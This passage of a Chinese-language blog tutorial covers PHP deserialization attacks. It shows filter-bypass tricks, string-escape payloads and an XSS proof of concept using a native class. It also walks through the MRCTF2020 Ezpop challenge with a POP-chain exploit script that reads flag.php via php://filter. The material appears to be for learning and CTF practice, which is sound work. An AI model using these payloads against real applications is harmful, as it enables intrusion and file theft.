class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面例子中将$a赋值给$b，然后反序列化$a，由于$b是引用关系，所以反序列化后$b也会被赋值为abc，所以反序列化后输出666</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br></pre></td></tr></table></figure><p>博主写了个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h3><p>情况一：过滤后字符串变多<br>下面的代码是把反序列化后的一个x替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure><p>正常情况,传入<code>name=mao</code></p><img src="/2024/09/10/WebSecurity/deserialization/image-1.png" class=""><p>如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p><img src="/2024/09/10/WebSecurity/deserialization/image-2.png" class=""><p>接下来我们传入：<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，这一部分共20个字符，由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符，造成溢出，而输出了<code>woaini</code>。</p><img src="/2024/09/10/WebSecurity/deserialization/image-3.png" class=""><p>情况二：过滤后字符串变少<br>这次是把两个x替换为1个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure><p>正常情况传入<code>name=mao&amp;age=11</code>的结果</p><img src="/2024/09/10/WebSecurity/deserialization/image-4.png" class=""><p>构造payload，由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面的<code>&quot;</code>闭合了前面的参数，就可以实现自定义执行了。</p><img src="/2024/09/10/WebSecurity/deserialization/image-5.png" class=""><h2 id="PHP原生类反序列化利用"><a href="#PHP原生类反序列化利用" class="headerlink" title="PHP原生类反序列化利用"></a><a href="https://blog.csdn.net/qq_53287512/article/details/123879744">PHP原生类反序列化利用</a></h2><p>PHP原生类中存在很多魔术方法的使用，可以利用这些原生类构造POP链。<br>可以用下面的脚本来查看原生类中哪些方法可以被调用   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个简单的小例子看下如何利用。有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>构造POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>可以实现xss，虽然原来的代码中没有什么类可以利用，但利用原生类可以实现</p><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">CTF中的反序列化</a></p><h3 id="「MRCTF2020」-Ezpop"><a href="#「MRCTF2020」-Ezpop" class="headerlink" title="「MRCTF2020」- Ezpop"></a>「MRCTF2020」- Ezpop</h3><p>打开页面后出现下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想让上面的代码显示出flag，可以注意到Modifier中的include，这个可以利用PHP文件包含漏洞实现，但是要怎么才能执行呢，继续往下看<br>题目中有很多的魔术方法，从可控的入口出发一一总结在下面</p><ul><li>@unserialize 在反序列化时会自动调用 __wakeup 方法，判断Show类应当是入口</li><li>_wakeup 中 有 <code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code>，这里将 <code>$this-&gt;source</code> 当做字符串处理会触发 __toString 方法</li><li>__toString 方法中，访问属性source <code>$this-&gt;str-&gt;source</code> ，如果source不存在就会调用 <code>__get</code> ，所以这里的 $this-&gt;str 应当为 Test 类</li><li>__get 方法中，调用 <code>$function()</code> ，这里 p 应当为 Modifier 类，将类当做函数调用，会自动调用 __invoke 方法</li></ul><p>明白了POP链的构造，就可以利用伪协议构造出下面的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload后，访问<code>?pop=</code>，即可得到flag。<br>注* 使用 “php:&#x2F;&#x2F;filter”伪协议” 来进行包含。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p><h2 id="实战漏洞分析"><a href="#实战漏洞分析" class="headerlink" title="实战漏洞分析"></a>实战漏洞分析</h2><h3 id="Laravel-RCE（CVE-2021-3129"><a href="#Laravel-RCE（CVE-2021-3129" class="headerlink" title="Laravel RCE（CVE-2021-3129"></a>Laravel RCE（CVE-2021-3129</h3><p><a href="https://www.freebuf.com/vuls/280508.html">https://www.freebuf.com/vuls/280508.html</a></p><h3 id="Laravel-v11-x-CVE-2024-40075"><a href="#Laravel-v11-x-CVE-2024-40075" class="headerlink" title="Laravel v11.x (CVE-2024-40075)"></a>Laravel v11.x (CVE-2024-40075)</h3><p><a 